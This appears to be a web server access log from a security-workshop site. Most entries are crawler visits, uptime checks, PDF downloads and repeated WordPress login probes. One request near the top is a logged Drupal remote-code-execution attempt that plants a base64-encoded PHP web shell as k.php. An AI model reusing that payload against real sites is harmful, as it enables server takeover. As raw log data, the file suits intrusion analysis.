5.196.87.138 - - [29/Apr/2018:13:43:04 -0400] "GET /robots.txt HTTP/1.1" 200 4297 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
59.124.153.166 - - [29/Apr/2018:13:44:01 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6211 "-" "curl/7.47.0"
66.249.73.89 - - [29/Apr/2018:13:44:37 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.189.228.167 - - [29/Apr/2018:13:45:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.189.228.167 - - [29/Apr/2018:13:45:43 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:13:46:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [29/Apr/2018:13:46:19 -0400] "GET /2018/cfp HTTP/1.1" 200 8153 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
88.71.93.7 - - [29/Apr/2018:13:46:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.71.93.7 - - [29/Apr/2018:13:46:22 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [29/Apr/2018:13:48:03 -0400] "GET /papers/2012/docs/p87.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
83.110.201.249 - - [29/Apr/2018:13:48:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.110.201.249 - - [29/Apr/2018:13:48:46 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [29/Apr/2018:13:49:06 -0400] "GET /2009/oc.shtml HTTP/1.1" 200 5592 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [29/Apr/2018:13:49:47 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 200 572187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:13:51:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [29/Apr/2018:13:51:30 -0400] "GET /2009/proceedings/1996/nspw1996-wulf.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [29/Apr/2018:13:53:13 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 200 149498 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
201.66.57.6 - - [29/Apr/2018:13:53:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.66.57.6 - - [29/Apr/2018:13:53:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.236 - - [29/Apr/2018:13:54:35 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.87 - - [29/Apr/2018:13:54:57 -0400] "GET /papers/2006/nspw2006-naegoe.pdf HTTP/1.1" 200 267940 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:13:56:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [29/Apr/2018:13:56:40 -0400] "GET /2017/dates HTTP/1.1" 200 6441 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.69.232.215 - - [29/Apr/2018:13:56:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
182.69.232.215 - - [29/Apr/2018:13:56:53 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
125.164.30.211 - - [29/Apr/2018:13:57:37 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
125.164.30.211 - - [29/Apr/2018:13:57:38 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:13:58:23 -0400] "GET /proceedings HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
84.115.17.50 - - [29/Apr/2018:13:59:12 -0400] "GET /2009/proceedings/1998/nspw1998-slater.pdf HTTP/1.1" 200 863929 "https://scholar.google.at/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
84.115.17.50 - - [29/Apr/2018:13:59:12 -0400] "GET /2009/proceedings/1998/nspw1998-slater.pdf HTTP/1.1" 206 7255 "https://scholar.google.at/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
84.115.17.50 - - [29/Apr/2018:13:59:12 -0400] "GET /2009/proceedings/1998/nspw1998-slater.pdf HTTP/1.1" 206 66182 "https://scholar.google.at/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
84.115.17.50 - - [29/Apr/2018:13:59:13 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
46.161.118.91 - - [29/Apr/2018:13:59:45 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.161.118.91 - - [29/Apr/2018:13:59:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.50.59.251 - - [29/Apr/2018:13:59:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.50.59.251 - - [29/Apr/2018:13:59:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
101.50.84.113 - - [29/Apr/2018:14:00:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
101.50.84.113 - - [29/Apr/2018:14:00:05 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:14:00:06 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
79.163.200.207 - - [29/Apr/2018:14:01:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.163.200.207 - - [29/Apr/2018:14:01:01 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:14:01:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [29/Apr/2018:14:01:39 -0400] "GET /2016 HTTP/1.1" 200 6966 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:14:01:50 -0400] "GET /2018 HTTP/1.1" 200 6904 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [29/Apr/2018:14:03:07 -0400] "GET /proceedings/2005 HTTP/1.1" 200 7198 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [29/Apr/2018:14:03:33 -0400] "GET /papers/2008/nspw2008-greenwald.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [29/Apr/2018:14:05:16 -0400] "GET /papers/1998/nspw1998-beaver.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:14:06:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [29/Apr/2018:14:06:33 -0400] "GET /2009/proceedings/2006/nspw2006-ford.pdf HTTP/1.1" 200 229507 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [29/Apr/2018:14:07:02 -0400] "GET /papers/2013/nspw2013-rowe.pdf HTTP/1.1" 200 609033 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:14:08:43 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 200 700592 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.252.67.151 - - [29/Apr/2018:14:09:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.252.67.151 - - [29/Apr/2018:14:09:46 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [29/Apr/2018:14:10:26 -0400] "GET /papers/2012/docs/p1.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
1.23.195.40 - - [29/Apr/2018:14:10:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
1.23.195.40 - - [29/Apr/2018:14:10:37 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:14:11:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [29/Apr/2018:14:12:10 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 200 904662 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
212.237.134.98 - - [29/Apr/2018:14:12:53 -0400] "GET /2018 HTTP/1.1" 200 6887 "https://www.google.dk/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:53 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2283 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:53 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 738 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:53 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1726 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 646 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 740 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 613 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5346 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 763 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27553 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1437 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:12:54 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7348 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET / HTTP/1.1" 200 3338 "https://www.google.dk/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 763 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27553 "https://www.nspw.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1586 "https://www.nspw.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7497 "https://www.nspw.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2518 "https://www.nspw.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 478 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 985 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 895 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3146 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 790 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3216 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 480 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 804 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:00 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 487 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:01 -0400] "GET /favicon.ico HTTP/1.1" 404 692 "https://www.nspw.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:04 -0400] "GET /proceedings HTTP/1.1" 200 2924 "https://www.nspw.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
212.237.134.98 - - [29/Apr/2018:14:13:13 -0400] "GET /past HTTP/1.1" 200 3117 "https://www.nspw.org/proceedings" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
66.249.73.89 - - [29/Apr/2018:14:13:54 -0400] "GET /papers/2001/nspw2001-raskin.pdf HTTP/1.1" 200 512638 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
60.51.34.181 - - [29/Apr/2018:14:14:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
60.51.34.181 - - [29/Apr/2018:14:14:14 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
42.112.231.81 - - [29/Apr/2018:14:14:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
42.112.231.81 - - [29/Apr/2018:14:14:21 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.190 - - [29/Apr/2018:14:15:15 -0400] "GET /2002/program.shtml HTTP/1.1" 200 7181 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [29/Apr/2018:14:15:37 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283643 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:14:16:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [29/Apr/2018:14:17:20 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 200 587393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [29/Apr/2018:14:18:56 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.91 - - [29/Apr/2018:14:19:03 -0400] "GET /2017/accepted HTTP/1.1" 200 6760 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.200 - - [29/Apr/2018:14:19:55 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.91 - - [29/Apr/2018:14:20:46 -0400] "GET /2009/proceedings/2013/nspw2013-egelman.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:14:21:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
193.6.49.2 - - [29/Apr/2018:14:21:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
193.6.49.2 - - [29/Apr/2018:14:21:41 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [29/Apr/2018:14:22:30 -0400] "GET /papers/2005/nspw2005-flechais.pdf HTTP/1.1" 200 2796418 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:14:24:14 -0400] "GET /papers/1993/nspw1993-slack.pdf HTTP/1.1" 200 519861 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.190 - - [29/Apr/2018:14:23:56 -0400] "GET /papers/2001/nspw2001-balacheff.pdf HTTP/1.1" 200 714469 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
41.13.76.194 - - [29/Apr/2018:14:24:58 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769023 "https://www.google.co.za/" "Mozilla/5.0 (Linux; Android 7.0; Hisense F10 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
41.13.76.194 - - [29/Apr/2018:14:25:18 -0400] "-" 408 3400 "-" "-"
66.249.73.91 - - [29/Apr/2018:14:25:57 -0400] "GET / HTTP/1.1" 200 6607 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:14:26:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [29/Apr/2018:14:21:07 -0400] "GET /papers/2013/nspw2013-mathur.pdf HTTP/1.1" 200 969440 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [29/Apr/2018:14:27:40 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 200 682818 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [29/Apr/2018:14:22:09 -0400] "GET /papers/2013/nspw2013-mathur.pdf HTTP/1.1" 200 867386 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.12 - - [29/Apr/2018:14:28:57 -0400] "GET /2014 HTTP/1.1" 200 12887 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.89 - - [29/Apr/2018:14:29:23 -0400] "GET /2017/cfp HTTP/1.1" 200 8988 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
